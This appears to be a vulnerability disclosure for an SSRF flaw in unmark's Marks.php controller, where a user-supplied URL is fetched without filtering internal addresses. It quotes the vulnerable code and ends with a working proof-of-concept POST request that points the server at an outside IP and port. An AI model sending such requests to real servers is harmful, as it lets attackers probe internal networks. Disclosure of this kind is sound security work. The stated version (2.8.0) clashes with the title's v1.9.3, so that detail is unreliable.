# SSRF vulnerability in unmark v1.9.3 of file /Marks.php

**vender**:

- [cdevroe/unmark: An open source to do app for bookmarks.](https://github.com/cdevroe/unmark)

**SoftLink**:

- [Release 1.9.3 · cdevroe/unmark](https://github.com/cdevroe/unmark/releases/tag/v1.9.3)

**Vulnerable File**

- application/controllers/Marks.php

**Version**

- 2.8.0

### Analyse

As seen in lines 33–45 of `application/controllers/Marks.php`:

```php
$dom = new DOMDocument();
libxml_use_internal_errors(true);
if (!$dom->loadHTMLFile($url, LIBXML_NOWARNING)) {
    foreach (libxml_get_errors() as $error) {
        // handle errors here
        echo '<p>There was an error adding the mark.</p>';
        if ( $error->code == 1549 ) {
            echo '<p>Most likely the URL is invalid or the web site isn\'t currently available.</p>';
        }
    }
    libxml_clear_errors();
    exit;
} else {
    $list = $dom->getElementsByTagName("title");
    if ($list->length > 0) {
        $title = $list->item(0)->textContent;
    }
}
```

### Evidence at the Code Level

- **Line 33**: `$dom->loadHTMLFile($url, LIBXML_NOWARNING)` directly uses the `$url` supplied by the user.
- **Lines 25–28**: Only checks whether the URL starts with `http://` or `https://`; no filtering of internal (private) addresses is performed.
- **No whitelist validation**: The code contains no mechanism to block or filter internal network addresses.

### POC

```
POST /marks/add HTTP/1.1
Host: www.unmark17.top
Referer: http://www.unmark17.top/marks
Cookie: BookEmDanno=q8psphj1utg6od6pbbhgcug26tlik5ip
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Origin: http://www.unmark17.top
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Length: 19

add_from_url=1&url=http://8.138.152.157:2333
```



![image-20250826023409811](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508260234056.png)